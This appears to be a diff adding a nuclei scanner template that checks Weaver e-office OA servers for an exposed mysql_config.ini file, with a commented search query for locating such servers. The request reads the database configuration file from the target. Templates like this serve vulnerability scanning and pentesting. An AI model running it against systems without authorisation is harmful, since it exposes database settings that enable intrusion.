@@ -1,0 +1,28 @@
+# Add your nuclei formatted PoC!
+id: eoffice-mysql-config-DLP
+
+info:
+  name: eoffice-mysql-config-DLP
+  author: yoyo
+  severity: critical
+  description: e-office mysql_config文件读取
+  tags: e-office,泛微oa,oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/mysql_config.ini'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "dataurl"
+        part: body
+
+      - type: status
+        status:
+          - 200
+
+#hunter-query:app="泛微-EOffice"
